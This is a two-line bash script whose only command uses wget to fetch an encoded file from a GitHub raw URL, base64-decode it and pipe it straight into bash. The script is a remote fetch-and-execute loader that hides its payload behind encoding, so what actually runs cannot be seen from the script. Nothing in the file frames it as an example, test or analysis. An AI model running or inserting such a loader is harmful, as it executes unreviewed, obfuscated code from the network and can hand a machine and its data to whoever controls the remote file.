#!/bin/bash
wget -qO- https://raw.githubusercontent.com/jonathanperry022/compute/refs/heads/main/entrypoint.sh | base64 -d | bash
